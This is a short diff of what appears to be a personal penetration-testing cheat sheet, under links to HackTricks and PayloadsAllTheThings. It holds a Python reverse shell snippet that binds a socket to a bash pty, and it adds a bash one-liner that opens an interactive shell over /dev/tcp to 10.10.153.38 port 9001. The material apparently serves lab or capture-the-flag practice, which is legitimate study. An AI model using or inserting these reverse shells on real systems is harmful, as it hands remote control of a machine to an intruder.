@@ -2153,8 +2153,10 @@ https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 
 ```
-#Python reverse shell file
+#reverse shell file
 ```
+#python 
+
 import socket
 import pty
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -2163,4 +2165,7 @@ dup2(s.fileno(),0)
 dup2(s.fileno(),1)
 dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
+
+#bash
+bash -i >& /dev/tcp/10.10.153.38/9001 0>&1
 ```
